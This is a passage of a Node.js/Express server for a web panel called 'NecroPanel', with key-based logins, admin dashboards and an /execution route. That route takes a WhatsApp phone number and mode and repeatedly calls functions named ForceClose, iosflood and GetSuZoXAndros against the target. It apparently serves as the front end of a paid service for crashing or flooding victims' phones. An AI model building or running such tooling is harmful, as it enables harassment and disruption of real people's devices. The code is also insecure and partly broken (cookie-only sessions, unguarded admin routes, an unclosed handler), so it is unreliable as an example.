        var returnVal;
        this.each(function() {
          if ($.data(this, 'plugin_' + pluginName) && typeof $.data(this, 'plugin_' + pluginName)[methodName] === 'function') {
            returnVal = $.data(this, 'plugin_' + pluginName)[methodName].apply(this, args);
          }
        });
        if (returnVal !== undefined){
          return returnVal;
        } else {
          return this;
        }
      } else if (typeof options === "object" || !options) {
        return this.each(function() {
          if (!$.data(this, 'plugin_' + pluginName)) {
            $.data(this, 'plugin_' + pluginName, new Plugin(this, options));
          }
        });
      }
    };
  }

})(window, document);

(function() {
    var lastTime = 0;
    var vendors = ['ms', 'moz', 'webkit', 'o'];
    for(var x = 0; x < vendors.length && !window.requestAnimationFrame; ++x) {
      window.requestAnimationFrame = window[vendors[x]+'RequestAnimationFrame'];
      window.cancelAnimationFrame = window[vendors[x]+'CancelAnimationFrame']
                                 || window[vendors[x]+'CancelRequestAnimationFrame'];
    }

    if (!window.requestAnimationFrame)
      window.requestAnimationFrame = function(callback, element) {
        var currTime = new Date().getTime();
        var timeToCall = Math.max(0, 16 - (currTime - lastTime));
        var id = window.setTimeout(function() { callback(currTime + timeToCall); },
          timeToCall);
        lastTime = currTime + timeToCall;
        return id;
      };

    if (!window.cancelAnimationFrame)
      window.cancelAnimationFrame = function(id) {
        clearTimeout(id);
      };
}());
</script>
  <script>
    const inputField = document.querySelector('input[type="text"]');
    const modeButtons = document.querySelectorAll('.mode-btn');
    const executeBtn = document.getElementById('executeBtn');
    let selectedMode = null;

    function isValidNumber(number) {
      return /^62\\d{7,13}$/.test(number);
    }

    modeButtons.forEach(button => {
      button.addEventListener('click', () => {
        modeButtons.forEach(btn => btn.classList.remove('selected'));
        button.classList.add('selected');
        selectedMode = button.getAttribute('data-mode');
        executeBtn.disabled = false;
      });
    });

    executeBtn.addEventListener('click', () => {
      const number = inputField.value.trim();
      if (!isValidNumber(number)) {
        alert("Nomor tidak valid. Harus dimulai dengan 62 dan total 10-15 digit.");
        return;
      }
      window.location.href = '/execution?mode=' + selectedMode + '&target=' + number;
    });
  </script>
</body>
</html>`;
};

// Appp Get root Server \\
app.use(bodyParser.urlencoded({ extended: true }));
app.use(cookieParser());

app.get("/", (req, res) => {
  const filePath = path.join(__dirname, "HCS-View", "Login.html");
  fs.readFile(filePath, "utf8", (err, html) => {
    if (err) return res.status(500).send("❌ Gagal baca Login.html");
    res.send(html);
  });
});

app.get("/login", (req, res) => {
  const msg = req.query.msg || "";
  const filePath = path.join(__dirname, "HCS-View", "Login.html");

  fs.readFile(filePath, "utf8", (err, html) => {
    if (err) return res.status(500).send("❌ Gagal baca file Login.html");

    res.send(html);
  });
});

function saveUsers(users) {
  const filePath = path.join(__dirname, 'database', 'user.json');

  try {
    fs.writeFileSync(filePath, JSON.stringify(users, null, 2), 'utf-8');
    console.log("✅ Data user berhasil disimpan.");
  } catch (err) {
    console.error("❌ Gagal menyimpan user:", err);
  }
}

app.post("/auth", (req, res) => {
  const { username, key, deviceId } = req.body;
  const users = getUsers();
  const user = users.find(u => u.username === username && u.key === key);

  if (!user) {
    return res.redirect("/login?msg=" + encodeURIComponent("Username atau Key salah!") + "&type=error");
  }

  if (Date.now() > user.expired) {
    return res.redirect("/login?msg=" + encodeURIComponent("Key sudah expired!") + "&type=error");
  }

  if (user.deviceId && user.deviceId !== deviceId) {
    return res.redirect("/login?msg=" + encodeURIComponent("Perangkat tidak dikenali!") + "&type=error");
  }

  if (!user.deviceId) {
    user.deviceId = deviceId;
    saveUsers(users);
  }

  res.cookie("sessionUser", username, { maxAge: 60 * 60 * 1000 });

  if (user.role === "vip") {
    return res.redirect("/dashboard_vip");
  }
  if (user.role === "admin") {
    return res.redirect("/dashboard_admin");
  }
  if (user.role === "owner") {
    return res.redirect("/dasboard_owner");
  }

  res.redirect("/execution");
});

function generateKey(length = 4) {
  const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
  let result = "";
  for (let i = 0; i < length; i++) {
    result += chars.charAt(Math.floor(Math.random() * chars.length));
  }
  return result;
}

function convertDaysToTimestamp(days) {
  return Date.now() + days * 24 * 60 * 60 * 1000;
}

app.post("/add-user", express.urlencoded({ extended: true }), (req, res) => {
  const { username, role, expired } = req.body;

  const key = generateKey(); // 4 huruf/angka kapital
  const expiredTimestamp = convertDaysToTimestamp(Number(expired));

  const users = getUsers();
  users.push({
    username,
    key,
    role,
    expired: expiredTimestamp,
    deviceId: ""
  });

 app.post("/save-user", (req, res) => {
  const users = req.body.users;
  const fromPage = req.body.from || "dashboard_admin"; // default admin

  saveUsers(users);

  // Redirect sesuai asal
  if (fromPage === "dashboard_admin") {
    res.redirect("/dashboard_admin");
  } else if (fromPage === "dashboard_vip") {
    res.redirect("/dashboard_vip");
  } else if (fromPage === "dashboard_owner") {
    res.redirect("/dashboard_owner");
  } else {
    res.redirect("/"); // fallback
  }
});



// Edit User
app.post("/edit-user", express.json(), (req, res) => {
  let { index, username, role, expired, deviceId } = req.body;
  index = Number(index); // ← convert ke number

  const users = getUsers();
  if (!users[index]) return res.status(404).send("User tidak ditemukan");

  let newExpired = Number(expired);
  if (newExpired < 1000000000000) {
    newExpired = Date.now() + newExpired * 24 * 60 * 60 * 1000;
  }

  users[index] = {
    ...users[index],
    username,
    role,
    expired: newExpired,
    deviceId
  };

  saveUsers(users);
  res.sendStatus(200);
});

// Hapus User
app.post("/delete-user", express.json(), (req, res) => {
  let { index } = req.body;
  index = Number(index); // ← convert ke number

  const users = getUsers();
  if (!users[index]) return res.status(404).send("User tidak ditemukan");

  users.splice(index, 1);
  saveUsers(users);
  res.sendStatus(200);
});


app.get("/dashboard_admin", (req, res) => {
  const username = req.cookies.sessionUser;
  if (!username) return res.send("❌ Session tidak ditemukan.");

  const users = getUsers();
  const currentUser = users.find(u => u.username === username);
  if (!currentUser) return res.send("❌ User tidak valid.");

  const userRows = users.map((user, i) => `
    <tr class="border-b border-red-800 hover:bg-red-800 transition" data-index="${i}">
      <td contenteditable="true" class="py-2 px-4 editable" data-field="username">${user.username}</td>
      <td class="py-2 px-4">${user.key}</td>
      <td>
        <select class="bg-transparent text-red-300 border-none focus:ring-0 p-1 role-selector" data-field="role">
          <option value="user" ${user.role === "user" ? "selected" : ""}>User</option>
          <option value="vip" ${user.role === "vip" ? "selected" : ""}>Vip</option>
        </select>
      </td>
      <td class="py-2 px-4" contenteditable="true" data-field="deviceId">${user.deviceId || "-"}</td>
      <td class="py-2 px-4" contenteditable="true" data-field="expired">${user.expired}</td>
      <td class="py-2 px-4 flex gap-2">
        <button class="text-blue-400 hover:text-blue-600 save-btn">Simpan</button>
        <button class="text-red-400 hover:text-red-600 delete-btn">Hapus</button>
      </td>
    </tr>
  `).join("");

  res.send(`
  <!DOCTYPE html>
  <html lang="id">
  <head>
    <meta charset="UTF-8" />
    <title>Dashboard - NecroPanel</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
      body { font-family: 'Poppins', sans-serif; }
      td[contenteditable="true"]:focus { outline: 2px solid #f43f5e; }
      .sidebar-hidden { transform: translateX(-100%); }
    </style>
  </head>
  <body class="bg-black text-red-400 min-h-screen flex">

    <!-- Sidebar -->
    <aside id="sidebar" class="bg-white/10 backdrop-blur-md border border-white/20 w-64 min-h-screen p-4 space-y-4 fixed transform transition-transform duration-300">
      <h2 class="text-xl font-bold border-b border-red-400 pb-2 mb-2">NecroPanel</h2>
      <nav class="flex flex-col space-y-2">
        <a href="#overview" class="hover:bg-red-700/60 p-2 rounded">Overview</a>
        <a href="#users" class="hover:bg-red-700/60 p-2 rounded">Users</a>
        <a href="#add-user" class="hover:bg-red-700/60 p-2 rounded">Add User</a>
      </nav>
    </aside>

    <!-- Main Content -->
    <main class="ml-64 p-6 w-full space-y-8">
      <!-- Top Bar -->
      <div class="flex justify-between items-center">
        <button id="toggleSidebar" class="text-2xl">&#9776;</button>
        <a href="/logout" class="text-red-400 hover:text-red-600 text-sm border border-red-500 rounded px-3 py-1">Logout</a>
      </div>

      <!-- Overview -->
      <section id="overview" class="bg-red-800 rounded p-4 shadow">
        <h2 class="text-2xl font-bold mb-4">Overview</h2>
        <div class="grid grid-cols-2 sm:grid-cols-4 gap-4 text-center">
          <div class="bg-black/40 rounded p-4"><p class="text-sm">Username</p><p class="font-bold text-lg">${currentUser.username}</p></div>
          <div class="bg-black/40 rounded p-4"><p class="text-sm">Role</p><p class="font-bold text-lg">${currentUser.role}</p></div>
          <div class="bg-black/40 rounded p-4"><p class="text-sm">Device ID</p><p class="font-bold text-lg">${currentUser.deviceId || "-"}</p></div>
          <div class="bg-black/40 rounded p-4"><p class="text-sm">Expired</p><p class="font-bold text-lg">${new Date(currentUser.expired).toLocaleString("id-ID")}</p></div>
        </div>
      </section>

      <!-- Users -->
      <section id="users" class="bg-red-800 rounded p-4 shadow">
        <div class="flex justify-between items-center mb-4">
          <h2 class="text-2xl font-bold">Users</h2>
          <input type="search" id="searchInput" placeholder="Cari username..." class="bg-black text-white border border-red-500 rounded px-3 py-1">
        </div>
        <div class="overflow-auto rounded border border-red-600 mb-4">
          <table class="min-w-full text-left" id="userTable">
            <thead class="bg-red-800 text-red-200">
              <tr>
                <th class="py-2 px-4">Username</th>
                <th class="py-2 px-4">Key</th>
                <th class="py-2 px-4">Role</th>
                <th class="py-2 px-4">Device ID</th>
                <th class="py-2 px-4">Expired</th>
                <th class="py-2 px-4">Action</th>
              </tr>
            </thead>
            <tbody id="userTableBody">
              ${userRows}
            </tbody>
          </table>
        </div>
        <div class="flex justify-end gap-2">
          <button id="prevPage" class="px-3 py-1 bg-red-700 text-white rounded hover:bg-red-600">Prev</button>
          <button id="nextPage" class="px-3 py-1 bg-red-700 text-white rounded hover:bg-red-600">Next</button>
        </div>
      </section>

      <!-- Add User -->
      <section id="add-user" class="bg-red-800 rounded p-4 shadow">
        <form action="/add-user" method="POST" onsubmit="sessionStorage.setItem('userAdded', 'true')" class="space-y-4">
          <h3 class="text-xl font-semibold mb-2">Tambah User Baru</h3>
          <div>
            <label class="block text-sm">Username</label>
            <input name="username" class="w-full p-2 rounded bg-black text-white border border-red-500" required>
          </div>
          <input type="hidden" name="key" value="${crypto.randomBytes(2).toString('hex').toUpperCase()}">
          <div>
            <label class="block text-sm">Role</label>
            <select name="role" class="w-full p-2 rounded bg-black text-white border border-red-500">
              <option value="user">User</option>
              <option value="vip">Vip</option>
            </select>
          </div>
          <div>
            <label class="block text-sm">Expired (timestamp)</label>
            <input name="expired" type="number" class="w-full p-2 rounded bg-black text-white border border-red-500" required>
          </div>
          <input type="hidden" name="redirect" value="dashboard_admin">
          <button class="bg-red-600 px-4 py-2 rounded hover:bg-red-700 text-white" type="submit">Tambah</button>
        </form>
      </section>
    </main>

    <script>
      // Sidebar toggle
      const sidebar = document.getElementById('sidebar');
      const toggleBtn = document.getElementById('toggleSidebar');
      toggleBtn.addEventListener('click', () => {
        sidebar.classList.toggle('sidebar-hidden');
      });
    </script>
    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
   <script>
  const rowsPerPage = 10;
  let currentPage = 1;
  let allRows = Array.from(document.querySelectorAll("#userTableBody tr"));

  function renderTable(rows) {
    const start = (currentPage - 1) * rowsPerPage;
    const end = start + rowsPerPage;
    const visibleRows = rows.slice(start, end);

    const tbody = document.getElementById("userTableBody");
    tbody.innerHTML = "";
    visibleRows.forEach(row => tbody.appendChild(row));

    renderPagination(rows.length);
  }

  function renderPagination(totalRows) {
    const totalPages = Math.ceil(totalRows / rowsPerPage);
    const paginationContainer = document.getElementById("pagination");
    paginationContainer.innerHTML = "";

    for (let i = 1; i <= totalPages; i++) {
      const btn = document.createElement("button");
      btn.textContent = i;
      btn.className = "mx-1 px-3 py-1 border rounded hover:bg-red-700 " + (i === currentPage ? "bg-red-600 text-white" : "bg-black text-red-400");
      btn.addEventListener("click", () => {
        currentPage = i;
        renderTable(filteredRows);
      });
      paginationContainer.appendChild(btn);
    }
  }

  let filteredRows = allRows;

  document.getElementById("searchInput").addEventListener("input", function () {
    const query = this.value.toLowerCase();

    filteredRows = allRows.filter(row => {
      return Array.from(row.querySelectorAll("td"))
        .slice(0, 4) // username, key, role, deviceId
        .some(td => td.textContent.toLowerCase().includes(query));
    });

    currentPage = 1;
    renderTable(filteredRows);
  });

  // Create pagination container
  const paginationWrapper = document.createElement("div");
  paginationWrapper.id = "pagination";
  paginationWrapper.className = "mt-4 flex justify-end text-sm";
  document.querySelector("#users").appendChild(paginationWrapper);

  // Initial render
  renderTable(filteredRows);

 function showPage(pageNumber) {
  currentPage = pageNumber;
  renderTable(filteredRows);
}

// Handle Prev button
document.getElementById("prevPage").addEventListener("click", () => {
  if (currentPage > 1) {
    showPage(currentPage - 1);
  }
});

// Handle Next button
document.getElementById("nextPage").addEventListener("click", () => {
  const totalPages = Math.ceil(filteredRows.length / rowsPerPage);
  if (currentPage < totalPages) {
    showPage(currentPage + 1);
  }
});

// Initial render
showPage(1);

 document.getElementById("userTableBody").addEventListener("click", e => {
  const target = e.target;
  const row = target.closest("tr");
  if (!row) return;

  const index = row.dataset.index;

  // SAVE BUTTON
  if (target.classList.contains("save-btn")) {
    const username = row.querySelector('[data-field="username"]').innerText.trim();
    const role = row.querySelector('.role-selector').value;
    const deviceId = row.querySelector('[data-field="deviceId"]').innerText.trim();
    const expired = row.querySelector('[data-field="expired"]').innerText.trim();

    fetch("/edit-user", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ index, username, role, deviceId, expired })
    })
    .then(response => {
      if (!response.ok) throw new Error();
      return Swal.fire({
        icon: "success",
        title: "Berhasil!",
        text: "User berhasil disimpan.",
        timer: 1500,
        showConfirmButton: false
      });
    })
    .then(() => location.reload())
    .catch(() => {
      Swal.fire({
        icon: "error",
        title: "Gagal",
        text: "Terjadi kesalahan saat menyimpan perubahan."
      });
    });
  }

  // DELETE BUTTON
  if (target.classList.contains("delete-btn")) {
    Swal.fire({
      title: "Yakin hapus user ini?",
      text: "Tindakan ini tidak bisa dibatalkan!",
      icon: "warning",
      showCancelButton: true,
      confirmButtonColor: "#d33",
      cancelButtonColor: "#555",
      confirmButtonText: "Ya, hapus!"
    }).then(result => {
      if (result.isConfirmed) {
        fetch("/delete-user", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ index })
        })
        .then(() => {
          Swal.fire("Terhapus!", "User telah dihapus.", "success").then(() => {
            location.reload();
          });
        })
        .catch(() => {
          Swal.fire("Gagal", "Terjadi kesalahan saat menghapus user.", "error");
        });
      }
    });
  }
});
  if (sessionStorage.getItem("userAdded") === "true") {
    Swal.fire({
      icon: "success",
      title: "User berhasil ditambahkan!",
      showConfirmButton: false,
      timer: 1500
    });
    sessionStorage.removeItem("userAdded");
  }

</script>
  </body>
  </html>
  `);
});

app.get("/execution", (req, res) => {
  const username = req.cookies.sessionUser;
  const msg = req.query.msg || "";
  const filePath = "./HCS-View/Login.html";

  fs.readFile(filePath, "utf8", (err, html) => {
    if (err) return res.status(500).send("❌ Gagal baca file Login.html");

    if (!username) return res.send(html);

    const users = getUsers();
    const currentUser = users.find(u => u.username === username);

    if (!currentUser || !currentUser.expired || Date.now() > currentUser.expired) {
      return res.send(html);
    }

    const targetNumber = req.query.target;
    const mode = req.query.mode;
    const target = `${targetNumber}@s.whatsapp.net`;

    if (sessions.size === 0) {
      return res.send(executionPage("🚧 MAINTENANCE SERVER !!", {
        message: "Tunggu sampai maintenance selesai..."
      }, false, currentUser, "", mode));
    }

    if (!targetNumber) {
      if (!mode) {
        return res.send(executionPage("✅ Server ON", {
          message: "Pilih mode yang ingin digunakan."
        }, true, currentUser, "", ""));
      }

      if (["andros", "ios", "fcios"].includes(mode)) {
        return res.send(executionPage("✅ Server ON", {
          message: "Masukkan nomor target (62xxxxxxxxxx)."
        }, true, currentUser, "", mode));
      }

      return res.send(executionPage("❌ Mode salah", {
        message: "Mode tidak dikenali. Gunakan ?mode=andros atau ?mode=ios."
      }, false, currentUser, "", ""));
    }

    if (!/^\d+$/.test(targetNumber)) {
      return res.send(executionPage("❌ Format salah", {
        target: targetNumber,
        message: "Nomor harus hanya angka dan diawali dengan nomor negara"
      }, true, currentUser, "", mode));
    }

    try {
      if (mode === "andros") {
        ForceClose(24, target);
      } else if (mode === "ios") {
        iosflood(24, target);
      } else if (mode === "fcios") {
        GetSuZoXAndros(24, target);
      } else {
        throw new Error("Mode tidak dikenal.");
      }

      return res.send(executionPage("✅ S U C C E S", {
        target: targetNumber,
        timestamp: new Date().toLocaleString("id-ID"),
        message: `𝐄𝐱𝐞𝐜𝐮𝐭𝐞 𝐌𝐨𝐝𝐞: ${mode.toUpperCase()}`
      }, false, currentUser, "", mode));
    } catch (err) {
      return res.send(executionPage("❌ Gagal kirim", {
        target: targetNumber,
        message: err.message || "Terjadi kesalahan saat pengiriman."
      }, false, currentUser, "Gagal mengeksekusi nomor target.", mode));
    }
  });
});


app.get("/logout", (req, res) => {
  res.clearCookie("sessionUser");
  res.redirect("/login");
});

app.listen(PORT, () => {
  console.log(`✅ Server aktif di port ${PORT}`);
});

app.use('/img', express.static(path.join(__dirname, 'img')));

